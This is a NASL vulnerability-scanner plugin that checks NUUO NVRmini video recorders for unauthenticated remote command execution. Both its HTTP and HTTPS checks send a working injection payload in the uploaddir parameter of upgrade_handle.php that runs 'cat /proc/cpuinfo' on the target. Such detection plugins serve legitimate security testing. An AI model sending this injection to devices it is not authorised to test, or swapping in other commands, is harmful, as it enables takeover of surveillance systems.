############################################################
# Author: ox50sec@webray.com.cn
# Copyright @WebRAY
############################################################
include("compat.inc");


if(description)
{
 script_id(51799068);
 name = "NUUO NVRmini Video storage management device upgrade_handle.php - remote command execution not authorized";
 script_name(name);
 script_category(ACT_ATTACK);
 script_family(english:"Camera");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_set_attribute(attribute:"risk_factor", value:"High");
 script_set_attribute(attribute:"description", value:"NUUO NVRmini the video storage management device has a vulnerability of unauthorized remote command execution. An attacker can execute arbitrary system commands without any permission, thus intruding into the server and gaining the administrator permission of the server, which is very harmful.");
 script_set_attribute(attribute:"solution", value:"Strictly filter the data entered by the user and prohibit the execution of system commands. Upgrade to the latest version: http://www.nuuo.com/.");
 script_end_attributes();
 script_copyright(english:"This script is Copyright (C) WebRAY, Inc.");
 script_require_ports("Services/www", 80);
 exit(0);
}


#
# The script code starts here
#
include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
include("misc_func.inc");
include("openvas-https.inc");



function check_vuln(port){
	host1 = get_host_name( );
	if( port==80 ) host=host1;
    else host = string(host1,":",port);
	req = "GET /upgrade_handle.php?cmd=writeuploaddir&uploaddir=%27;cat%20/proc/cpuinfo;%27" + ' HTTP/1.1\r\n' +
		  'Host: ' + host + '\r\n' +
		  'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0\r\n' +
		  'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
		  'Accept-Language: en-US,en;q=0.5\r\n' +
		  'Connection: close\r\n' +
		  'Cache-Control: max-age=0\r\n\r\n';
	buf = http_keepalive_send_recv(port:port,data:req,bodyonly:FALSE);
	if( buf == NULL) exit(0);
	con = req + buf;
	if( "200 O"><buf && "CPU implementer"><buf && "CPU architecture"><buf && "CPU revision"><buf ){
		if (report_verbosity > 0) security_hole(port:port, extra:con);
			  else security_hole(port);
	}
}

function check_vuln_ssl(port){
	host1 = get_host_name( );
	if( port==443 ) host=host1;
    else host = string(host1,":",port);
	url = "/upgrade_handle.php?cmd=writeuploaddir&uploaddir=%27;cat%20/proc/cpuinfo;%27";
	req = string("GET ", url,  " HTTP/1.1\r\n",
             "Host: ", host,"\r\n",
			 "User-Agent: ", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0\r\n",
			 "Accept: ", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
			 "Accept-Language: ", "en-US,en;q=0.5\r\n",
			 "Connection: ", "close\r\n",
			 "Cache-Control: ", "max-age=0\r\n\r\n");
	
    ssl_req = https_req_get(port:port,request:req);
	
	if( ssl_req == NULL) exit(0);
	con = req + ssl_req;
	if("200 O"><ssl_req && "CPU implementer"><ssl_req && "CPU architecture"><ssl_req && "CPU revision"><ssl_req ){
		if (report_verbosity > 0) security_hole(port:port, extra:con);
			  else security_hole(port);
	}
}


##################################
kbs = get_kb_list("www/banner/*");
foreach k (keys(kbs)) {
	port = substr(k,11);
	ssl = get_kb_list("SSL/Transport/"+port);
	if(!ssl) {
   		check_vuln(port:port);
	} else {
   		check_vuln_ssl(port:port);
	}
}
